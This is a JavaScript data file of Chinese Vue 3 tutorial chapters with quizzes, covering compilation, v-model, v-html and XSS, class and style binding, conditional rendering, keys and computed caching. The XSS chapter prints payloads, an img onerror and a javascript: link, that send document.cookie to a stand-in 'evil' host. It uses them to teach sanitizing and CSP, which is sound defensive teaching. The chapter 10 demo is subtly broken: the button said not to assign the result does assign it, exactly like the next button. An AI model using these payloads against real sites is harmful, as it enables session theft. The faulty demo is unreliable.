/* 第 2 篇 · 深入理解与自查 */
window.VUE_DEEP = window.VUE_DEEP || {};

window.VUE_DEEP[5] = {
  deep: `### 编译之后，插值变成了什么

模板不是「HTML + 占位符」，它会被编译器翻译成一段 JS。你可以把 \`{{ msg }}\` 理解成：

\`\`\`js
// 编译结果（简化）
_createElementVNode("span", null, _toDisplayString(_ctx.msg), 1 /* TEXT */)
\`\`\`

三个关键点：

1. \`_ctx.msg\` 是一次**属性读取**——这正是依赖收集发生的时刻（第 1.4 章那条链的起点）。
2. \`_toDisplayString\` 负责把 \`null\` 显示成空串、把对象转成 JSON 样式的字符串。所以 \`{{ null }}\`、\`{{ undefined }}\` 不报错，只是空白。
3. 末尾那个数字是 **PatchFlag**，告诉运行时「这个节点只有文本会变」，diff 时跳过属性比对。

而 \`:id="dynamicId"\` 编译成：

\`\`\`js
_createElementVNode("div", { id: _ctx.dynamicId }, null, 8 /* PROPS */, ["id"])
\`\`\`

属性值同样是一次读取，只是它最终进入 \`patchProp\`，被写到真实 DOM 的 attribute/property 上。

### 为什么属性里不能写双大括号

因为编译器只把**文本节点**里的 \`{{ }}\` 当插值。属性值在编译期被当作「静态字符串或 v-bind 表达式」，\`id="{{ x }}"\` 里的 \`{{ x }}\` 会被原样保留成字符串。浏览器也不会报错，于是你就得到一个「看起来绑定了、但其实是个死字符串」的 id。

这是「无报错的错误」，比抛异常更危险。凡是属性，一律用 \`:属性名="表达式"\`。

### patchProp 的三个边界行为

| 你写的 | 实际效果 | 原因 |
| --- | --- | --- |
| \`:title="null"\` | 该属性被移除 | \`patchProp\` 对 null/undefined 走 \`removeAttribute\` |
| \`:disabled="false"\` | 不设置该属性 | 布尔属性：false 等于没有 |
| \`:data-num="0"\` | 设置成字符串 "0" | DOM 属性值最终是字符串 |

第三行常被忽略：\`getAttribute('data-num')\` 拿到的是 \`'0'\`（字符串），不是数字 0。要比较请用 \`Number()\`。

### 表达式每次都重新求值

\`\`\`html
<p>{{ list.filter(i => i.done).length }} / {{ list.length }}</p>
\`\`\`

这行看起来只算两次，实际每次组件重渲染都会**再执行一遍 filter**。如果有 5 个这样的表达式、列表 1000 条，每次输入框敲一个字就要过滤 5000 次。

这就是「模板里不要放重计算」的真实原因：它不是风格问题，而是**每次渲染都会执行**。正确做法是搬到 \`computed\`（有缓存），模板只留 \`{{ doneCount }}\`。

### 动手验证（3 分钟）

\`\`\`html
<div id="app">
  <p>{{ nullVal }}|{{ undefinedVal }}</p>
  <div id="a" :title="nullVal" :data-num="0">看属性</div>
</div>
<script>
  Vue.createApp({ data: () => ({ nullVal: null, undefinedVal: undefined }) }).mount('#app')
  const el = document.querySelector('#a')
  console.log('title 存在吗:', el.hasAttribute('title'))
  console.log('data-num 类型:', typeof el.getAttribute('data-num'), el.getAttribute('data-num'))
</script>
\`\`\`

> 💡 你会看到 \`title 存在吗: false\`（null 被移除），\`data-num 类型: string\`（0 变成了字符串）。这两个结论都能直接解释线上「属性怎么没了」和「数字比较为什么失败」的问题。`,
  quiz: [
    { q: '模板里的 {{ list.filter(...).length }} 每次重渲染会执行几次？该怎么改？', a: '每次渲染执行一次（有几个这样的表达式就执行几次），与依赖是否变化无关。应搬到 computed，依赖不变时读缓存。' },
    { q: '为什么 id="{{ x }}" 不会报错但也不生效？', a: '编译器只处理文本节点里的插值，属性值中的 {{ }} 会被当作普通字符串原样输出。属性必须用 v-bind（简写 :）绑定。' },
    { q: ':disabled="false" 和 :title="null" 的渲染结果分别是什么？', a: '布尔属性 disabled 为 false 时不会出现在元素上；title 为 null 时会执行 removeAttribute，属性被移除。两者都不报错。' }
  ]
};

window.VUE_DEEP[6] = {
  deep: `### v-model 的编译结果，决定了它的所有行为

\`\`\`html
<input v-model="mytext">
\`\`\`

编译后大致是：

\`\`\`js
_createElementVNode("input", {
  value: _ctx.mytext,
  "onUpdate:modelValue": $event => ((_ctx.mytext) = $event)
}, null, 8, ["value", "onUpdate:modelValue"])
\`\`\`

也就是说：**它既是「value 的单向绑定」，又是「input 事件的反向赋值」**。这解释了三件事：

- 为什么必须在组件上声明 \`modelValue\` 与 \`update:modelValue\`（第 5.5 章）：编译产物就是用这两个名字。
- 为什么「双向绑定不等于子组件能改父数据」：赋值语句写在**父组件的渲染上下文**里，改的是父组件的变量。
- 为什么输入法打中文时值会「跳」：\`v-model\` 在中文输入法组合期间也会触发更新，导致拼音被写进数据。Vue 内部用 \`compositionstart/compositionend\` 做了保护，但你自己用 \`:value\` + \`@input\` 手写时不会有这层保护——这是很多人「自己封装输入框后中文输入异常」的根因。

### methods 里的 this 是怎么来的

\`\`\`js
export default {
  methods: { add() { this.datalist.push(1) } }
}
\`\`\`

Vue 在初始化时把每个 method 用 \`bind(vm)\` 绑定到组件实例，再挂到实例上。所以：

- 普通函数写法里 \`this\` 一定是组件实例，无论怎么被调用。
- 箭头函数没有自己的 \`this\`，\`bind\` 也改不了它，于是 \`this\` 变成模块作用域的 \`undefined\`（或 window）。

这也是为什么「methods 里写箭头函数拿不到 data」不是玄学，而是 JS 的 \`this\` 规则 + Vue 的 bind 一起作用的结果。

### push 之后到底发生了什么

\`\`\`js
this.datalist.push({ id: 1, title: 'x' })
\`\`\`

1. \`push\` 读取 \`datalist.length\`（触发 get，收集依赖）。
2. 写入新索引 \`datalist[3] = item\`（触发 set）。
3. 写入新的 \`length\`（再次触发 set）。
4. 依赖集合里的渲染 effect 被调度，进入微任务队列。
5. 本轮同步代码执行完，微任务执行，组件重新渲染，列表多一行。

注意第 4 步：**更新不是同步的**。所以 \`push\` 之后立刻读 DOM 拿不到新行，要 \`await nextTick()\`。

### 用 index 当 key，删除时错在哪

列表 \`[A, B, C]\`，输入框里各填了值，key 是 0/1/2。删除 B 之后：

| key | 旧内容 | 新内容 | Vue 的判断 |
| --- | --- | --- | --- |
| 0 | A（输入框"a"） | A | 复用，输入框保留"a" |
| 1 | B（输入框"b"） | C | key 1 还在，复用这个 DOM，只改文本 → 输入框仍是"b" |
| 2 | C（输入框"c"） | — | 删除 |

结果：C 那一行显示着 B 的输入内容。这就是「用 index 当 key 会串数据」的完整机制——不是玄学，是 key 相同导致 DOM 被复用。

### 动手验证（5 分钟）

\`\`\`html
<div id="app">
  <input v-model="text"><button @click="add">add</button>
  <ul>
    <li v-for="(item, i) in list" :key="i">
      {{ item.title }} <input placeholder="备注">
      <button @click="del(i)">del</button>
    </li>
  </ul>
</div>
<script>
  Vue.createApp({
    data: () => ({ text: '', next: 1, list: [{ id: 1, title: 'A' }, { id: 2, title: 'B' }, { id: 3, title: 'C' }] }),
    methods: {
      add() { this.list.push({ id: ++this.next, title: this.text }); this.text = '' },
      del(i) { this.list.splice(i, 1) }
    }
  }).mount('#app')
</script>
\`\`\`

1. 在每行的「备注」里输入不同内容。
2. 删掉中间一行。
3. 把 \`:key="i"\` 改成 \`:key="item.id"\` 再删一次。

> 💡 第一次：被删行之后的备注内容整体上移了一格；第二次：备注跟着自己那一行一起被删掉。这个对比做一遍，比记十条结论都牢。`,
  quiz: [
    { q: 'v-model 编译后由哪两部分组成？这解释了「双向绑定为什么不算破坏单向数据流」？', a: '由 :value（单向绑定）和 @input 事件里的赋值组成。赋值语句位于**父组件**的渲染上下文，改的是父自己的变量，子组件并没有修改传入的 prop。' },
    { q: 'push 之后马上读取 DOM，为什么拿不到新元素？', a: 'push 只是把「重新渲染」排进了微任务队列，同步代码还没执行完时 DOM 尚未更新。需要 await nextTick() 或 $nextTick 后再读。' },
    { q: '用 index 作 key 删除中间项，为什么后面的输入框内容会错位？', a: '删除后 key 0/1/2 发生平移，Vue 认为「这些 key 仍然存在」，于是复用原 DOM 只更新文本，输入框这类 DOM 自身状态就留在了错误的行上。用稳定 id 作 key 才会整行删除。' }
  ]
};

window.VUE_DEEP[7] = {
  deep: `### textContent 与 innerHTML：浏览器的两条赋值通道

\`\`\`js
el.textContent = '<b>hi</b>'   // 页面显示字面量 <b>hi</b>
el.innerHTML  = '<b>hi</b>'    // 页面显示加粗的 hi
\`\`\`

- \`textContent\` 把内容当**纯文本**，不解析标签。
- \`innerHTML\` 交给 **HTML 解析器**，会创建元素、执行部分副作用（加载图片、触发 onerror、解析样式）。

Vue 的插值走的是前者，\`v-html\` 走的是后者。所以「v-html 有风险」不是 Vue 的限制，而是 \`innerHTML\` 本身的能力边界：它让字符串拥有了「创建元素 + 触发事件」的权力。

### XSS 到底怎么发生的（三个具体向量）

\`\`\`html
<!-- 1. 事件属性：图片加载失败即执行 -->
<img src="x" onerror="fetch('//evil?c=' + document.cookie)">

<!-- 2. 伪协议：点击就执行 -->
<a href="javascript:fetch('//evil?c=' + document.cookie)">点我</a>

<!-- 3. SVG 内嵌脚本 -->
<svg onload="alert(document.cookie)"></svg>
\`\`\`

三者共同点：**都是合法 HTML**，\`innerHTML\` 不会拦。所以「过滤掉 script 标签」根本不够——事件属性、伪协议、svg 都不含 script 标签。

正确的过滤方式是白名单：只允许指定的标签与属性（DOMPurify 做的就是这件事），而不是黑名单删 \`<script>\`。

### 为什么「前端过滤」不是终点

用户可以把请求直接打到你的接口（curl / Postman），完全绕过前端。所以：

| 层 | 该做什么 |
| --- | --- |
| 输入 | 服务端校验长度、格式、白名单字符 |
| 存储 | 存原始内容，不要存「已经转义过的」版本（会导致二次转义） |
| 输出 | 按上下文转义：HTML 文本、属性、JS 字符串、URL 各不相同 |
| 渲染 | 前端能用插值就用插值；必须 v-html 时再过一遍 DOMPurify |
| 兜底 | 配置 CSP，禁止内联脚本执行 |

CSP 是最后一道网：即使有 XSS 注入点，\`script-src 'self'\` 也能让内联脚本无法执行。

### 「我需要换行」其实不需要 v-html

\`\`\`html
<p class="text" v-text="content"></p>
<style>.text { white-space: pre-line; }</style>
\`\`\`

\`pre-line\` 会保留 \`\\n\` 并合并多余空格，正好满足「多行文本显示」。这是零风险方案，比引入 DOMPurify 轻得多。

### 动手验证（3 分钟）

在任意页面控制台执行：

\`\`\`js
const d = document.createElement('div')
d.innerHTML = '<img src=x onerror="console.log(\\'onerror 被触发了\\')">'
document.body.appendChild(d)
\`\`\`

> 💡 控制台会打印「onerror 被触发了」——你只是赋了一个字符串，却让浏览器执行了代码。再换成 \`d.textContent = 同样的字符串\`，什么都不会发生，页面只是显示这段文本。这一次对比能让「为什么 v-html 危险」变成直觉。`,
  quiz: [
    { q: '为什么「过滤掉 <script> 标签」不足以防 XSS？', a: '因为执行代码不一定要 script 标签：onerror/onload 等事件属性、href="javascript:" 伪协议、SVG 内嵌脚本都能执行。必须用白名单方式过滤（如 DOMPurify），而不是黑名单删标签。' },
    { q: '只想显示多行文本（保留换行），除了 v-html 还有什么方案？', a: '用插值或 v-text 输出，配合 CSS white-space: pre-line（或 pre-wrap）。完全不经过 HTML 解析，没有 XSS 风险。' },
    { q: '服务端已经过滤过用户输入了，前端为什么还要用插值而不是 v-html？', a: '纵深防御：服务端过滤可能漏、可能有历史脏数据、也可能被绕过（直接调接口）。前端默认转义是零成本的第二道防线，v-html 只留给可信内容。' }
  ]
};

window.VUE_DEEP[8] = {
  deep: `### class 绑定在编译后是一段「归一化」逻辑

\`\`\`html
<div class="card" :class="{ active: isActive }">
\`\`\`

编译后 class 的值是 \`_normalizeClass(["card", { active: _ctx.isActive }])\`。这个函数会：

1. 把字符串原样保留；
2. 把对象里值为真的键取出；
3. 把数组递归展开；
4. 丢掉 null / undefined / false。

最后得到一个字符串（或数组），交给 \`patchClass\` 去设置 \`el.className\`。**静态 class 不会被覆盖**，因为它在同一个归一化数组里一起参与计算——这就是「静态 + 动态会合并」的机制，而不是 Vue 特意做了合并。

### 对象 key 为什么要加引号

\`\`\`js
{ 'text-danger': hasError }   // ✅
{ text-danger: hasError }     // ❌ 语法错误
\`\`\`

这跟 Vue 没关系，是 **JS 对象字面量的语法**：键名含连字符时必须是字符串字面量。同理 \`{ 'is-active': true }\`。很多人误以为是 Vue 的规则，其实换到普通 JS 也一样。

### style 绑定每次渲染都会重设

\`\`\`html
<div :style="{ width: pct + '%' }">
\`\`\`

每次渲染，Vue 会把新的 style 对象和旧的做比较，只 patch 变化的属性。但如果你写成：

\`\`\`html
<div :style="getStyle()">
\`\`\`

\`getStyle()\` 每次渲染都返回一个**新对象**，比较仍然按 key 逐项进行，所以不会整块重设——但函数本身每次都被调用。真正的问题在「大量静态样式用 style 绑定」：它们本该是 class，写进 style 后每个元素都多了一份内联样式，既增加 HTML 体积，也无法被 CSS 优先级/媒体查询覆盖。

判断标准：**值的来源是数据（算出来的）→ style；值的来源是设计（可穷举的）→ class。**

### v-show 编译成了什么

\`\`\`html
<div v-show="ok">
\`\`\`

编译后是 \`_withDirectives(..., [[_vShow, _ctx.ok]])\`，\`vShow\` 指令内部：

\`\`\`js
// 简化
el.style.display = value ? el._vod : 'none'   // _vod 记录原始 display 值
\`\`\`

它会把元素原本的 \`display\`（比如 \`flex\`）存到 \`_vod\`，隐藏时设 \`none\`，显示时**恢复原值**。这就是为什么 \`v-show\` 隐藏再显示后，\`display: flex\` 不会变成 \`block\`。

也解释了它的两个限制：\`<template>\` 没有真实元素（无 style 可改），所以不支持；\`v-show\` 也不会销毁子组件，所以表单状态会保留。

### 动手验证（3 分钟）

\`\`\`html
<style>.active { color: #c00; } .card { padding: 4px; }</style>
<div id="app">
  <div class="card" :class="{ active: on }">文本</div>
  <button @click="on = !on">toggle</button>
</div>
<script>Vue.createApp({ data: () => ({ on: true }) }).mount('#app')</script>
\`\`\`

1. 点击切换，观察 \`class\` 变为 \`card\` 与 \`card active\`。
2. 在控制台执行 \`document.querySelector('.card').className\`。
3. 把 \`:class\` 改成 \`:style="{ color: on ? 'red' : '' }"\`，再 toggle。

> 💡 第二种写法里，关闭时 \`color\` 变成空字符串——它仍然是一次「设置样式」，而不是「移除样式」。如果原来有 CSS 规则给这个元素上色，class 方案能正常工作，空字符串的 style 方案会把它覆盖掉。`,
  quiz: [
    { q: '静态 class 与 :class 同时存在时，为什么不会互相覆盖？', a: '编译后两者被一起传给 normalizeClass，归一化成一个值再 patch 到元素上，属于同一次计算，不是两次赋值。' },
    { q: 'v-show 隐藏再显示后，元素原本的 display: flex 为什么还在？', a: 'vShow 指令把原始 display 值存在元素上（_vod），隐藏时改成 none，恢复时写回原值，而不是简单清空 style.display。' },
    { q: '为什么说「大量静态样式用 :style 绑定」是坏做法？', a: '静态样式应交给 class，可复用、可被媒体查询和优先级覆盖；内联 style 会增大 HTML、难以覆盖、也无法参与样式表管理。' }
  ]
};

window.VUE_DEEP[9] = {
  deep: `### v-if 编译成条件表达式，v-show 编译成指令

\`\`\`html
<div v-if="ok">A</div>
<div v-show="ok">B</div>
\`\`\`

大致编译为：

\`\`\`js
_ctx.ok ? _createElementVNode("div", null, "A") : _createCommentVNode("v-if", true)
_withDirectives(_createElementVNode("div", null, "B"), [[_vShow, _ctx.ok]])
\`\`\`

- \`v-if\` 为假时生成的是**注释节点**，作为占位。真实元素根本没被创建。
- \`v-show\` 的 div **永远被创建**，只是带一个指令去改 \`display\`。

所以「v-if 惰性」是编译产物决定的：条件为假，创建元素的那段代码压根没执行。

### 为什么 v-if 切换会丢表单内容

切换时组件会经历：\`beforeUnmount → unmounted → 新建实例 → beforeMount → mounted\`。内部 \`data\` / \`setup\` 的状态全部重新初始化。这不是 Vue 的疏漏，而是「销毁重建」的定义。

三种保状态的手段：

| 手段 | 机制 | 代价 |
| --- | --- | --- |
| \`v-show\` | 元素一直存在，只改 display | 初始渲染与内存 |
| \`<KeepAlive>\` | 缓存组件实例，切走时 deactivated | 缓存占内存、状态可能陈旧 |
| 状态提升到父组件/store | 数据不在组件里，自然不丢 | 需要设计状态归属 |

### v-if / v-else 的分支链为什么必须「相邻」

编译器把连续的 \`v-if / v-else-if / v-else\` 编译成**一个三元表达式链**。中间插入任何元素（包括注释、空白文本节点以外的真实元素），链就断了，\`v-else\` 会变成孤立的节点，直接报错「v-else has no adjacent v-if」。

### v-if 与 v-for 的优先级陷阱

Vue 3 里 \`v-if\` 优先级**高于** \`v-for\`。所以：

\`\`\`html
<li v-for="item in list" v-if="item.done">...</li>
\`\`\`

会被编译成「先判断 item.done，再循环」——而 \`item\` 此时还不存在，直接报错。Vue 2 相反（v-for 先），所以老代码迁移过来特别容易炸。

正确写法只有一种：先用 \`computed\` 过滤出需要的数组，再 \`v-for\` 渲染过滤后的结果。

### 动手验证（3 分钟）

\`\`\`html
<div id="app">
  <p><button @click="show = !show">toggle</button></p>
  <div v-if="show"><input placeholder="v-if 里的输入框"></div>
  <div v-show="show"><input placeholder="v-show 里的输入框"></div>
</div>
<script>Vue.createApp({ data: () => ({ show: true }) }).mount('#app')</script>
\`\`\`

1. 在两个输入框里各输入一段文字。
2. 点 toggle 关掉，再点开。
3. 打开 Elements 面板看 DOM 数量。

> 💡 v-if 的输入框内容被清空（DOM 被删了重造）；v-show 的内容还在（DOM 一直在，只是 display 变了）。Elements 里关闭状态下，v-if 位置是一个注释节点 \`<!--v-if-->\`，v-show 的 div 还在，只是带着 \`style="display: none"\`。`,
  quiz: [
    { q: 'v-if 为假时，DOM 树里留下的是什么？v-show 呢？', a: 'v-if 留下一个注释节点作为占位，真实元素未被创建；v-show 的元素始终存在，只把 style.display 改成 none。' },
    { q: 'Vue 3 中 v-if 与 v-for 写在同一元素上会发生什么？为什么？', a: '报错：v-if 优先级更高，在循环变量 item 尚未定义时就求值。应先用 computed 过滤数据，再对结果做 v-for。' },
    { q: '「切 tab 后表单内容丢了」，用 v-show 和 KeepAlive 分别怎么解决？差别是什么？', a: 'v-show 让元素/组件始终存在，只是隐藏；KeepAlive 在切走时缓存实例（触发 deactivated）。前者零额外机制但一直占内存，后者可控制缓存范围并需要处理「状态陈旧」（在 activated 里刷新）。' }
  ]
};

window.VUE_DEEP[10] = {
  deep: `### 无 key 时，diff 就是「按位置改内容」

假设旧列表 \`[A, B, C]\`，新列表 \`[A, C]\`，都没有 key。Vue 的 \`patchUnkeyedChildren\` 会：

1. 取两者长度的较小值（2），按索引 0、1 逐个 patch：
   - 索引 0：旧 A vs 新 A → 更新（内容一样，等于没变）
   - 索引 1：旧 B vs 新 C → 把 B 的文本改成 C
2. 新列表更短，删除索引 2 的旧 C。

结果 DOM 上是 3 个节点删掉 1 个，剩 2 个——**节点本身没换，只是内容被改写**。对纯文本无害，对带内部状态的元素（输入框、勾选框、动画、第三方实例）就是灾难。

### 有 key 时，是「按身份找节点」

Vue 用的是「首尾双指针 + key 映射表」：

1. 旧头 vs 新头、旧尾 vs 新尾，四个方向依次比对，命中就直接 patch 并移动指针。
2. 四个方向都不命中时，把**旧列表剩余节点的 key 建成 Map**，用新节点的 key 去查：
   - 查到 → 复用该 DOM，并移动到正确位置；
   - 查不到 → 新建节点插入。
3. 循环结束后，旧列表剩下的删除，新列表剩下的插入。

复杂度从「全表遍历 O(n²)」降到「O(n)」——这就是 key 带来的性能收益，也是它能保证「身份正确」的原因。

### 为什么 key 必须稳定且唯一

| key 选择 | 问题 |
| --- | --- |
| \`item.id\` | 正确 |
| \`index\` | 删除/排序后身份错位，导致状态串行、动画乱飞 |
| \`Math.random()\` | 每次渲染都变，等于「全部销毁重建」，性能最差，输入框必然失焦 |
| \`item.title\` | 标题可以重复，key 重复会导致复用错乱（控制台会警告） |

### 数组变更为什么能被侦测，而 filter 不能

\`\`\`js
list.push(x)          // 内部：读写 length、写入新索引 → 触发 set → 更新
list.filter(fn)       // 只做 get，没有任何 set → 不触发更新
\`\`\`

Vue 3 通过 Proxy 拦截数组的 \`set\`（含索引与 length），所以 \`push/pop/splice/sort/reverse/shift/unshift\` 全部天然可侦测。而 \`filter/map/slice/concat\` 是**只读**方法，不写原数组，自然不会触发——必须把返回值赋回去。

\`\`\`js
this.list = this.list.filter(fn)      // ✅ 赋值触发了 set
this.list.sort((a, b) => a.id - b.id) // ✅ sort 原地修改，能侦测
\`\`\`

### 动手验证（5 分钟）

\`\`\`html
<div id="app">
  <button @click="list.push(list.length + 1)">push</button>
  <button @click="list = list.filter(n => n !== 2)">filter 掉 2（不赋值给 list）</button>
  <button @click="list = list.filter(n => n !== 2)">filter 掉 2（赋值）</button>
  <p>{{ list.join(', ') }}</p>
</div>
<script>Vue.createApp({ data: () => ({ list: [1, 2, 3] }) }).mount('#app')</script>
\`\`\`

> 💡 第二个按钮点了没反应、第三个按钮生效——但注意：\`list = list.filter(...)\` 本身已经改变了 \`list.value\` 的引用，即使页面不刷新，打印出来也是新数组。这正好说明「数据变了」与「视图更新」是两件事，靠 set 拦截把两者接上。`,
  quiz: [
    { q: '无 key 的列表 diff 为什么说是「按位置改内容」？', a: '它按索引逐个 patch 新旧节点，长度差异处补删或新增。节点没换身份，只是内容被改写，所以带内部状态的元素会串行。' },
    { q: 'list.filter() 为什么不会触发视图更新，而 list.sort() 会？', a: 'filter 只读原数组并返回新数组，没有任何 set 操作；sort 原地修改数组（读写索引），触发 Proxy 的 set，从而派发更新。filter 的结果必须赋回响应式属性。' },
    { q: '用 Math.random() 当 key 会造成什么后果？', a: '每次渲染 key 都不同，diff 找不到可复用节点，等于全部销毁重建：性能最差、输入框失焦、动画每次都重播，还可能出现重复 key 警告。' }
  ]
};

window.VUE_DEEP[11] = {
  deep: `### 三个「看起来一样」的过滤写法，执行次数差很多

| 写法 | 每次渲染执行 | 是否缓存 |
| --- | --- | --- |
| 模板里 \`v-if="item.includes(key)"\`，配合 v-for | 对**每一项**求值一次 | 否 |
| \`methods: { filterList() {...} }\` 在模板里调用 | 整个函数执行一次 | 否（每次渲染都调用） |
| \`computed: { filterList() {...} }\` | 依赖变化时才执行 | 是 |

三者结果相同，差别只在「什么时候重算」。列表 200 条、关键字每敲一个字重渲染一次：第一种 200 次字符串比较，第二种 1 次 filter（内部 200 次），第三种 1 次——而且关键字不变时连这 1 次都省了。

### computed 的「脏标记」是怎么工作的

\`\`\`text
第一次读 computed
  → 执行 getter，读到 list 与 keyword
  → 把当前 computed 的 effect 注册进 list、keyword 的依赖集合
  → 缓存结果，dirty = false

keyword 变化
  → 该 computed 的 scheduler 被触发，仅把 dirty 置为 true（不立刻重算）

模板再次读 computed
  → dirty 为 true，重新执行 getter，更新缓存
\`\`\`

所以它不是「缓存了结果就一直用」，而是「**依赖没变就复用，变了才重算**」。这也解释了为什么在 computed 里读 \`Date.now()\`、\`Math.random()\` 会拿到过期值——这些不是响应式依赖，永远不会让 dirty 变 true。

### 为什么 v-for 里套 v-if 是「双重浪费」

\`\`\`html
<template v-for="item in list" :key="item">
  <li v-if="item.includes(key)">{{ item }}</li>
</template>
\`\`\`

它要为**每一条**都创建 vnode 再判断是否渲染（判断在 patch 阶段），而过滤后的列表可能只有 2 条。数据量越大、命中率越低，浪费越明显。用 computed 先过滤，vnode 数量就等于结果数量。

### 一个容易被忽略的细节：过滤后 key 从哪来

\`\`\`html
<li v-for="item in filterList" :key="item.id">
\`\`\`

如果列表项是字符串（没有 id），用 \`item\` 本身作 key 也可以——前提是字符串唯一。若可能重复（比如两个同名商品），就需要在数据源里加 id。**key 的唯一性由数据保证，不是模板能解决的**。

### 动手验证（5 分钟）

\`\`\`html
<div id="app">
  <input v-model="key" placeholder="输入关键字">
  <p>方法过滤：{{ byMethod() }} 次调用见控制台</p>
  <p>计算属性：{{ byComputed.join(',') }}</p>
  <p>列表：{{ list.length }} 条</p>
</div>
<script>
  Vue.createApp({
    data: () => ({ key: '', list: Array.from({ length: 200 }, (_, i) => 'item-' + i) }),
    methods: {
      byMethod() { console.log('method 执行'); return this.list.filter(i => i.includes(this.key)).length }
    },
    computed: {
      byComputed() { console.log('computed 执行'); return this.list.filter(i => i.includes(this.key)) }
    }
  }).mount('#app')
</script>
\`\`\`

1. 输入框里每敲一个字符，看控制台打印了几次「method 执行」「computed 执行」。
2. 敲完后再点一下页面空白处（触发无关重渲染），观察。

> 💡 每敲一个字，两个都执行一次；但如果是「因其他状态导致的重新渲染」，method 会再执行，computed 不会。这就是缓存的真实含义：**不是不执行，而是依赖不变就不重复执行**。`,
  quiz: [
    { q: 'computed 的缓存失效条件到底是什么？README 里说的「依赖不变就不重算」具体指什么？', a: '指它的**响应式依赖**没变。任一依赖被写（触发 scheduler，把 dirty 置 true）后，下次读取才重算；读 Date.now()/随机数这类非响应式来源不会让缓存失效，所以会拿到旧值。' },
    { q: '「v-for 里套 v-if」相比「computed 过滤后再 v-for」，浪费在哪？', a: '前者会为每一条数据创建 vnode 再在 patch 阶段判断是否渲染，vnode 数量等于原列表长度；后者 vnode 数量等于过滤结果长度，且过滤结果被缓存。' },
    { q: '列表项是纯字符串时，key 能直接用 item 吗？什么时候不行？', a: '字符串唯一时可以直接用；若存在重复值（同名、同文本），key 会重复，导致复用错乱并出现警告，此时要在数据源里补一个唯一 id。' }
  ]
};
